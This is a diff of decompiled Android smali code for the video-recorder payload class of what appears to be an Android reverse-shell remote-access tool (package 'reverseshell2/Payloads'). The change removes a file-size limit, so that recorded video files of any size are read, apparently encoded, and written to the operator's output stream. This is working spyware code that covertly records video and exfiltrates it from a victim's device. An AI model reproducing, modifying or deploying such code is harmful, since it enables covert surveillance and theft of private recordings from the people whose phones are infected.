@@ -151,58 +151,7 @@
     .locals 6
     .param p0, "file"    # Ljava/io/File;
 
-    .line 215
-    invoke-virtual {p0}, Ljava/io/File;->length()J
-
-    move-result-wide v0
-
-    const-wide/32 v2, 0xf42400
-
-    cmp-long v4, v0, v2
-
-    if-lez v4, :cond_0
-
-    .line 216
-    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->TAG:Ljava/lang/String;
-
-    const-string v1, "Scamm"
-
-    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
-
-    .line 218
-    :try_start_0
-    sget-object v0, Lcom/example/reverseshell2/Payloads/videoRecorder;->outputStream:Ljava/io/OutputStream;
-
-    const-string v1, "Large file cant transfer\nEND123\n"
-
-    const-string v2, "UTF-8"
-
-    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
-
-    move-result-object v1
-
-    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
-    :try_end_0
-    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
-
-    .line 221
-    goto :goto_0
-
-    .line 219
-    :catch_0
-    move-exception v0
-
-    .line 220
-    .local v0, "e":Ljava/io/IOException;
-    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
-
-    .line 222
-    .end local v0    # "e":Ljava/io/IOException;
-    :goto_0
-    return-void
-
     .line 224
-    :cond_0
     new-instance v0, Ljava/lang/Thread;
 
     new-instance v1, Lcom/example/reverseshell2/Payloads/videoRecorder$5;
@@ -227,7 +176,7 @@
 
     .line 237
     .local v0, "data":[B
-    :try_start_1
+    :try_start_0
     new-instance v2, Ljava/io/BufferedInputStream;
 
     new-instance v3, Ljava/io/FileInputStream;
@@ -270,20 +219,20 @@
 
     .line 251
     invoke-virtual {v4}, Ljava/lang/Thread;->start()V
-    :try_end_1
-    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
     .line 253
     .end local v2    # "buf":Ljava/io/BufferedInputStream;
     .end local v3    # "encodedVideo":Ljava/lang/String;
-    goto :goto_1
+    goto :goto_0
 
     .line 252
-    :catch_1
+    :catch_0
     move-exception v2
 
     .line 254
-    :goto_1
+    :goto_0
     return-void
 .end method
 
